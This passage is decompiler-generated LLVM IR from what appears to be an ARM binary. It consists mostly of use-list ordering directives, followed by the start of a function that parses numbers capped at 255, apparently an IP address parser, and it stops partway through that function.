  uselistorder i32 %v9_15b78, { 1, 0, 2 }
  uselistorder i32 %v6_15b74, { 1, 0 }
  uselistorder i32 %v2_15b6c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15b6c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15b7c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15b60, { 0, 2, 1 }
  uselistorder i32 %v13_15b5c, { 1, 0 }
  uselistorder i32 %v4_15b58, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15b58, { 2, 0, 1 }
  uselistorder i32 %v6_15b60, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15b50, { 0, 2, 1 }
  uselistorder i32 %v16_15b4c, { 1, 0 }
  uselistorder i32 %v4_15b48, { 1, 2, 0 }
  uselistorder i32 %v0_15b58.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15b50, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15b3c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15b38, { 1, 0 }
  uselistorder i32 %v1_15b34, { 1, 0 }
  uselistorder i32 %v10_15b30, { 1, 0 }
  uselistorder i32 %v0_15b30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b34, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15b28, { 0, 2, 1 }
  uselistorder i32 %v2_15b1c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15b1c, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_15b3448, { 1, 2, 0 }
  uselistorder i32 %v1_15b14, { 2, 1, 0 }
  uselistorder i32 %v1_15b0c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15b04, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15b00, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15afc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15afc, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_15ae8, { 0, 2, 1 }
  uselistorder i32 %v3_15adc, { 1, 0 }
  uselistorder i32 %v2_15ad4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15ac4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15aa4, { 1, 0, 2 }
  uselistorder i32 %v5_15aa4, { 1, 0, 2 }
  uselistorder i32 %v2_15aa4, { 1, 0, 2 }
  uselistorder i32 %v3_15aa0, { 1, 0 }
  uselistorder i32 %v0_15aa4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15ac4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15a7c, { 0, 2, 1 }
  uselistorder i32 %v3_15a70, { 1, 0 }
  uselistorder i32 %v2_15a68, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15a58, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15a38, { 1, 0, 2 }
  uselistorder i32 %v5_15a38, { 1, 0, 2 }
  uselistorder i32 %v2_15a38, { 1, 0, 2 }
  uselistorder i32 %v3_15a34, { 1, 0 }
  uselistorder i32 %v0_15a38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15a58, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15a10, { 0, 2, 1 }
  uselistorder i32 %v3_15a04, { 1, 0 }
  uselistorder i32 %v2_159fc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_159ec, { 1, 0, 3, 2 }
  uselistorder i32 %v8_159cc, { 1, 0, 2 }
  uselistorder i32 %v5_159cc, { 1, 0, 2 }
  uselistorder i32 %v2_159cc, { 1, 0, 2 }
  uselistorder i32 %v3_159c8, { 1, 0 }
  uselistorder i32 %v0_159cc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_159ec, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_15a94, { 2, 0, 1 }
  uselistorder i32 %v0_15a98, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_159ec74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1599c, { 1, 0 }
  uselistorder i32 %v0_1599c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_15994, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15994, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15994, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_159ec75, { 2, 1, 0 }
  uselistorder i32 %v1_15974, { 1, 0, 2 }
  uselistorder i32 %v1_1594c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1594c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_15938, { 1, 0, 2 }
  uselistorder i32 %v6_15934, { 1, 0 }
  uselistorder i32 %v2_1592c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1592c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1593c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_15924, { 0, 2, 1 }
  uselistorder i32 %v3_15924, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15924, { 1, 0 }
  uselistorder i1 %v1_15924, { 1, 0 }
  uselistorder i32 %v3_15920, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15918, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_15904, { 1, 2, 0 }
  uselistorder i32 %v12_158f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_158ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_158f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_158e0, { 0, 2, 1 }
  uselistorder i32 %v2_158d8, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_158d8, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v1_158d0, { 1, 0 }
  uselistorder i32 %v1_158c8, { 2, 1, 0 }
  uselistorder i32 %v2_158c0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_158c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v2_158b0, { 1, 0 }
  uselistorder i32 %v1_158b0, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_158b0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 35, 36, 37, 38, 39, 40, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 25, 1, 2, 3, 4, 5, 26, 6, 7, 8, 9, 10, 27, 11, 12, 13, 14, 15, 28, 66, 67, 69, 68, 70, 71, 16, 17, 18, 19, 21, 20, 22, 23, 24, 29, 30, 61, 31, 32, 33, 34, 35, 62, 36, 37, 38, 39, 40, 63, 41, 42, 43, 44, 45, 64, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 56, 19, 20, 21, 55, 58, 59, 61, 60, 62, 63, 65, 64, 66, 57, 22, 53, 23, 54, 24, 25, 26, 27, 28, 31, 29, 41, 30, 32, 35, 33, 42, 34, 36, 39, 37, 43, 38, 40, 44, 45, 46, 48, 47, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 23, 1, 2, 24, 3, 4, 25, 5, 6, 7, 8, 26, 28, 13, 29, 31, 30, 32, 33, 35, 34, 36, 27, 9, 10, 11, 12, 14, 15, 16, 18, 17, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 41, 42, 43, 44, 45, 46, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 36, 37, 38, 39, 40, 41, 42, 12, 13, 3, 14, 15, 16, 0, 17, 1, 19, 2, 20, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 42, 43, 44, 45, 46, 47, 48, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 31, { 21, 22, 1, 0, 10, 12, 11, 13, 2, 15, 14, 26, 16, 6, 17, 23, 18, 24, 19, 25, 20, 7, 3, 8, 4, 5, 9 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -2, { 12, 13, 11, 23, 0, 15, 1, 16, 2, 3, 10, 8, 9, 7, 6, 5, 4, 24, 25, 26, 27, 14, 22, 21, 20, 19, 18, 17 }
  uselistorder i32 65536, { 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 62, 61, 63, 64, 65, 66, 1, 67, 0, 2, 68, 69, 70, 71, 72, 75, 73, 74, 76, 77, 78, 82, 83, 84, 85, 79, 80, 81, 86, 89, 90, 91, 87, 88, 92, 93, 94, 95, 96, 98, 97, 99, 3, 100, 102, 103, 101, 104, 105, 107, 108, 109, 106, 110, 111, 112, 113, 114, 115, 141, 117, 116, 142, 119, 118, 120, 122, 121, 124, 123, 125, 4, 126, 128, 129, 130, 127, 131, 5, 132, 136, 137, 138, 133, 134, 135, 140, 139 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32* @r5, { 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 217, 218, 219, 220, 221, 222, 223, 224, 225, 229, 226, 227, 228, 230, 749, 750, 751, 752, 753, 0, 754, 755, 617, 618, 619, 620, 621, 622, 552, 553, 554, 555, 556, 557, 558, 559, 596, 597, 598, 599, 600, 601, 623, 624, 625, 632, 633, 634, 635, 626, 627, 628, 629, 630, 631, 158, 159, 160, 231, 232, 4, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 119, 120, 560, 561, 562, 563, 564, 565, 121, 566, 148, 567, 568, 569, 3, 2, 570, 571, 122, 123, 124, 125, 126, 149, 116, 117, 118, 152, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 153, 154, 155, 156, 150, 151, 572, 573, 574, 575, 576, 157, 577, 578, 13, 579, 580, 581, 582, 591, 592, 593, 583, 584, 585, 586, 587, 588, 589, 590, 5, 182, 183, 184, 185, 186, 187, 188, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 189, 190, 191, 192, 193, 194, 195, 196, 6, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 1, 216, 244, 245, 246, 247, 248, 15, 249, 250, 251, 252, 253, 254, 255, 256, 16, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 7, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 594, 595, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 636, 637, 616, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 11, 675, 676, 677, 678, 679, 680, 681, 14, 682, 683, 8, 684, 685, 9, 686, 687, 10, 688, 689, 690, 691, 692, 693, 17, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 12, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736 }
  uselistorder i32 -3, { 1, 2, 0, 3, 4, 6, 5 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 11, { 13, 14, 15, 18, 19, 4, 1, 5, 2, 6, 3, 45, 46, 47, 48, 49, 0, 16, 7, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 8, 30, 31, 32, 9, 33, 34, 35, 10, 36, 37, 38, 39, 40, 41, 42, 43, 44, 11, 50, 51, 52, 12, 53 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24 }
  uselistorder i32 48, { 0, 9, 10, 7, 8, 2, 15, 3, 1, 11, 4, 12, 5, 13, 6, 14 }
  uselistorder i32 40, { 1, 9, 2, 0, 4, 23, 24, 10, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 6, 25, 7, 26, 5, 27, 8, 28 }
  uselistorder i32 36, { 1, 8, 9, 6, 7, 0, 2, 3, 10, 4, 11, 5, 12 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0 }
  uselistorder i32 -32, { 1, 0, 2, 3 }
  uselistorder i32 24, { 0, 67, 68, 37, 38, 1, 69, 70, 34, 35, 14, 13, 81, 44, 82, 45, 60, 39, 15, 40, 16, 41, 17, 42, 43, 63, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 64, 59, 65, 61, 62, 83, 84, 85, 66, 86, 2, 71, 18, 3, 72, 19, 20, 4, 73, 21, 74, 22, 5, 23, 24, 6, 25, 7, 8, 9, 26, 10, 75, 27, 76, 77, 78, 28, 29, 11, 79, 30, 80, 31, 87, 88, 89, 90, 91, 32, 92, 12, 36, 33, 93 }
  uselistorder i32* @lr, { 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 1, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 25, 26, 151, 152, 69, 70, 71, 72, 88, 89, 90, 91, 27, 28, 29, 30, 31, 92, 93, 4, 5, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 73, 74, 77, 78, 3, 81, 79, 80, 75, 76, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 63, 64, 65, 66, 67, 34, 109, 6, 7, 8, 9, 10, 11, 12, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 68, 110, 111, 112, 82, 83, 84, 85, 86, 87, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126 }
  uselistorder i32 16, { 27, 28, 29, 177, 30, 178, 179, 31, 180, 181, 32, 182, 183, 184, 185, 186, 187, 83, 84, 72, 73, 88, 85, 86, 87, 89, 22, 90, 91, 4, 5, 6, 7, 8, 21, 9, 10, 0, 11, 12, 45, 159, 46, 74, 33, 47, 75, 76, 160, 162, 163, 164, 23, 71, 13, 14, 20, 69, 15, 165, 16, 48, 161, 49, 79, 34, 80, 38, 37, 36, 77, 35, 78, 39, 50, 51, 52, 53, 54, 55, 81, 56, 82, 57, 58, 24, 92, 93, 94, 95, 59, 96, 97, 98, 99, 100, 101, 102, 60, 103, 104, 105, 41, 106, 40, 107, 108, 62, 109, 110, 111, 112, 113, 1, 61, 114, 115, 116, 64, 117, 118, 119, 120, 121, 2, 63, 122, 65, 123, 124, 125, 17, 126, 18, 127, 70, 19, 66, 67, 128, 129, 3, 43, 130, 42, 131, 132, 133, 134, 135, 136, 25, 137, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 148, 149, 26, 150, 151, 152, 153, 154, 156, 155, 157, 158, 166, 167, 168, 169, 170, 68, 171, 44, 172, 173, 174, 175, 176 }
  uselistorder i32 20, { 112, 3, 113, 114, 0, 4, 115, 28, 29, 22, 23, 1, 30, 31, 32, 33, 24, 16, 25, 17, 26, 18, 27, 95, 5, 96, 6, 97, 21, 94, 34, 35, 7, 36, 37, 38, 39, 40, 41, 42, 8, 43, 44, 45, 46, 47, 48, 49, 50, 51, 9, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 10, 62, 63, 64, 65, 66, 67, 68, 69, 11, 70, 71, 72, 2, 73, 74, 75, 76, 19, 77, 78, 79, 80, 81, 82, 83, 84, 13, 85, 12, 86, 87, 88, 89, 15, 90, 14, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 20, 111 }
  uselistorder i32 27, { 1, 0, 3, 2, 4 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 7, { 30, 31, 33, 67, 73, 4, 34, 5, 16, 36, 17, 35, 2, 18, 68, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 38, 39, 40, 6, 41, 42, 43, 44, 7, 45, 46, 47, 48, 8, 49, 9, 50, 10, 51, 52, 11, 53, 54, 12, 55, 56, 57, 58, 59, 13, 60, 61, 62, 63, 64, 14, 65, 3, 66, 0, 28, 69, 1, 29, 70, 71, 32, 15, 72 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 7, 13, 12, 11, 10, 22, 23, 24, 25, 8, 26, 0, 29, 9, 27, 28, 6, 1, 3, 2, 4, 5 }
  uselistorder i32* @ip, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 4, 5, 49, 1, 0, 2, 3 }
  uselistorder i1 false, { 41, 42, 43, 78, 14, 40, 79, 80, 37, 38, 39, 81, 13, 82, 83, 0, 46, 45, 47, 44, 1, 3, 4, 49, 2, 11, 15, 50, 5, 6, 7, 48, 84, 85, 86, 10, 8, 9, 87, 53, 88, 89, 54, 90, 20, 21, 22, 23, 55, 91, 92, 71, 93, 94, 95, 60, 96, 25, 26, 61, 97, 62, 98, 56, 57, 58, 24, 99, 59, 100, 101, 70, 102, 103, 104, 105, 106, 107, 63, 64, 108, 109, 65, 110, 66, 67, 111, 68, 112, 69, 113, 51, 52, 114, 115, 116, 117, 118, 119, 27, 28, 72, 120, 121, 73, 34, 122, 74, 17, 18, 29, 19, 30, 31, 32, 12, 33, 123, 35, 75, 76, 124, 16, 77, 125, 36, 126 }
  uselistorder i32 4, { 87, 78, 79, 5, 442, 80, 443, 64, 6, 7, 81, 444, 82, 445, 446, 447, 448, 83, 449, 450, 451, 452, 84, 453, 454, 455, 456, 457, 8, 458, 459, 460, 461, 462, 85, 463, 63, 464, 465, 466, 467, 468, 469, 9, 10, 86, 470, 246, 247, 201, 202, 248, 249, 250, 471, 472, 473, 474, 475, 149, 150, 151, 65, 152, 153, 404, 406, 405, 402, 403, 360, 361, 362, 363, 407, 408, 409, 410, 392, 393, 394, 411, 412, 154, 155, 156, 157, 158, 53, 11, 12, 251, 252, 253, 254, 255, 256, 13, 14, 73, 15, 16, 74, 413, 414, 199, 17, 18, 108, 88, 415, 416, 66, 205, 109, 206, 159, 207, 364, 365, 366, 223, 224, 62, 61, 367, 208, 209, 203, 204, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 110, 226, 227, 228, 225, 75, 368, 111, 229, 89, 112, 113, 19, 369, 20, 370, 371, 21, 22, 372, 373, 55, 374, 54, 379, 114, 380, 115, 381, 116, 382, 117, 383, 118, 384, 119, 386, 120, 387, 388, 385, 375, 121, 376, 377, 378, 237, 160, 239, 23, 240, 241, 238, 24, 242, 56, 122, 243, 244, 323, 257, 230, 69, 68, 67, 231, 123, 25, 26, 27, 28, 29, 30, 232, 57, 233, 58, 234, 235, 236, 31, 32, 124, 90, 125, 126, 161, 245, 0, 127, 33, 258, 259, 162, 260, 261, 262, 163, 164, 129, 263, 128, 264, 91, 265, 266, 165, 267, 268, 166, 167, 269, 92, 270, 93, 271, 272, 168, 169, 273, 170, 274, 275, 171, 172, 130, 276, 94, 277, 95, 278, 279, 280, 281, 282, 131, 283, 96, 284, 285, 286, 173, 287, 288, 289, 290, 174, 175, 2, 291, 132, 292, 97, 293, 294, 295, 176, 296, 297, 177, 178, 3, 133, 298, 98, 299, 99, 300, 301, 179, 302, 303, 304, 305, 306, 180, 181, 307, 308, 135, 309, 4, 134, 310, 100, 311, 136, 312, 313, 314, 315, 316, 182, 317, 318, 319, 183, 184, 138, 320, 137, 101, 321, 102, 322, 324, 325, 326, 327, 328, 140, 329, 141, 330, 185, 331, 332, 333, 186, 187, 142, 334, 139, 335, 103, 336, 104, 337, 188, 338, 339, 34, 189, 340, 341, 35, 190, 342, 343, 36, 191, 344, 345, 37, 192, 76, 346, 347, 38, 348, 193, 349, 350, 39, 194, 351, 352, 40, 195, 353, 354, 41, 196, 355, 356, 42, 197, 357, 358, 43, 417, 359, 389, 390, 391, 395, 396, 397, 44, 398, 399, 1, 400, 198, 401, 418, 419, 107, 420, 421, 77, 422, 143, 423, 424, 425, 426, 105, 427, 144, 428, 429, 430, 106, 431, 145, 432, 45, 46, 47, 433, 434, 72, 71, 70, 435, 48, 49, 50, 146, 436, 147, 437, 51, 52, 438, 59, 439, 60, 148, 440, 441, 200 }
  uselistorder i32* @r2, { 78, 79, 26, 9, 27, 29, 28, 30, 31, 32, 33, 8, 80, 2, 81, 86, 87, 90, 82, 49, 53, 54, 57, 55, 56, 50, 51, 52, 43, 14, 15, 0, 16, 17, 1, 88, 3, 89, 6, 34, 35, 36, 10, 83, 84, 85, 4, 58, 59, 60, 7, 61, 62, 63, 5, 64, 65, 66, 67, 68, 44, 11, 12, 13, 47, 48, 45, 46, 21, 22, 40, 18, 19, 20, 23, 24, 25, 37, 38, 39, 41, 42, 69, 70, 71, 72, 73, 74, 75, 76, 77 }
  uselistorder label %dec_label_pc_15d18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15be0, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 3, 2 }
  uselistorder label %dec_label_pc_15b6c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_15b30, { 1, 0 }
  uselistorder label %dec_label_pc_15b1c, { 1, 0 }
  uselistorder label %dec_label_pc_15adc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_159a4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_15918, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_158d8, { 1, 0 }
}

define i32 @function_15d38(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d38:
  ret i32 %arg1
}

define i32 @function_15d40() local_unnamed_addr {
dec_label_pc_15d40:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15d40 = load i32, i32* @r0, align 4
  %v2_15d40 = icmp eq i32 %v0_15d40, 0
  %v3_15d44 = load i32, i32* @r4, align 4
  store i32 %v3_15d44, i32* %stack_var_-20, align 4
  %v0_15d48 = load i32, i32* @r1, align 4
  br i1 %v2_15d40, label %dec_label_pc_15e20, label %dec_label_pc_15d5c.lr.ph

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d5c.lr.ph, %dec_label_pc_15de0
  %v1_15de0 = phi i32 [ 0, %dec_label_pc_15d5c.lr.ph ], [ %v5_15de0, %dec_label_pc_15de0 ]
  %v0_15de4 = phi i32 [ 1, %dec_label_pc_15d5c.lr.ph ], [ %v1_15de4, %dec_label_pc_15de0 ]
  %v0_15d64 = phi i32 [ %v0_15d40, %dec_label_pc_15d5c.lr.ph ], [ %v0_15d6425, %dec_label_pc_15de0 ]
  %v1_15d64 = inttoptr i32 %v0_15d64 to i8*
  %v2_15d64 = load i8, i8* %v1_15d64, align 1
  %v3_15d64 = zext i8 %v2_15d64 to i32
  %v3_15d68 = mul nuw nsw i32 %v3_15d64, 2
  %v4_15d68 = add i32 %v3_15d68, %v2_15d60.pre
  %v5_15d68 = inttoptr i32 %v4_15d68 to i8*
  %v6_15d68 = load i8, i8* %v5_15d68, align 1
  %v1_15d6c = and i8 %v6_15d68, 8
  %v2_15d6c = icmp eq i8 %v1_15d6c, 0
  br i1 %v2_15d6c, label %dec_label_pc_15e20, label %dec_label_pc_15d74

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d5c
  br label %dec_label_pc_15d94

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d94
  %v3_15d80 = mul i32 %v0_15de0, 10
  %v4_15d80 = add i32 %v3_15d94, %v3_15d80
  %v1_15d84 = add i32 %v4_15d80, -48
  %v8_15d8c = icmp sgt i32 %v1_15d84, 255
  br i1 %v8_15d8c, label %dec_label_pc_15e20, label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d7c
  %v1_15d90 = add i32 %v0_15dd0, 1
  store i32 %v1_15d90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d74, %dec_label_pc_15d90
  %v0_15de0 = phi i32 [ 0, %dec_label_pc_15d74 ], [ %v1_15d84, %dec_label_pc_15d90 ]
  %v0_15dd0 = phi i32 [ %v0_15d64, %dec_label_pc_15d74 ], [ %v1_15d90, %dec_label_pc_15d90 ]
  %v1_15d94 = inttoptr i32 %v0_15dd0 to i8*
  %v2_15d94 = load i8, i8* %v1_15d94, align 1
  %v3_15d94 = zext i8 %v2_15d94 to i32
  %v2_15d98 = mul nuw nsw i32 %v3_15d94, 2
  %v2_15d9c = add i32 %v2_15d98, %v2_15d60.pre
  %v3_15da0 = inttoptr i32 %v2_15d9c to i8*
  %v4_15da0 = load i8, i8* %v3_15da0, align 1
  %v6_15da0 = zext i8 %v4_15da0 to i32
  %v1_15dac = and i32 %v6_15da0, 8
  %v2_15dac = icmp eq i32 %v1_15dac, 0
  br i1 %v2_15dac, label %dec_label_pc_15db4, label %dec_label_pc_15d7c

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15d94
  %v8_15db8 = icmp sgt i32 %v0_15de4, 3
  br i1 %v8_15db8, label %dec_label_pc_15dcc, label %dec_label_pc_15dbc

